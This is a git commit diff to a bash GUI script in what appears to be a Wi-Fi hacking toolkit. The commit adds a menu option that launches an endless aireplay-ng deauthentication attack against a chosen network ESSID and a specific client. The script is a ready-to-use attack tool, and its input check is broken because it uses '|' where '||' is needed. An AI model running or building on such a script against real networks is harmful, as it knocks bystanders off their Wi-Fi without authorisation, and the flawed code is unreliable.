15fb4fd41a7f3c80994b3cc6512e1910a685bce5
mikhailsimon <mikhailsimon0705@gmail.com>
2023-04-15 22:10:54 +0800

    added essid with client dmac attack

--- commands/wirelesshack/deauth/deauth.sh
+++ commands/wirelesshack/deauth/deauth.sh
@@ -1,4 +1,4 @@
-prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth" --width=300 --height=300)
+prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth(ESSID)" "Deauth(ESSID+Client)" --width=300 --height=300)
 
 check_adapter() {
 iwconfig | zenity --text-info --title="Available Adapter List" --width=500 --height=300
@@ -16,7 +16,7 @@ then
  gnome-terminal -- sudo aireplay-ng -9 $wlan
 fi
 
-if [ "$prompt1" == "Deauth" ]
+if [ "$prompt1" == "Deauth(ESSID)" ]
 then
  check_adapter
  wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
@@ -28,3 +28,18 @@ then
   fi
  zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" "$wlan"
 fi
+
+if [ "$prompt1" == "Deauth(ESSID+Client)" ]
+then
+ check_adapter
+ wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
+ essid=$(zenity --entry --title="ESSID" --text="ESSID:" --width=300)
+ cbssid=$(zenity --entry --title="Client BSSID" --text="Client BSSID:" --width=300)
+  if [ -z "$wlan" ] | [ -z "$essid" ] | [ -z "$cbssid" ]
+   then
+     zenity --info --title="Error" --text="Please insert input"
+     exit 1
+  fi
+ zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" -c "$cbssid" "$wlan"
+fi
+
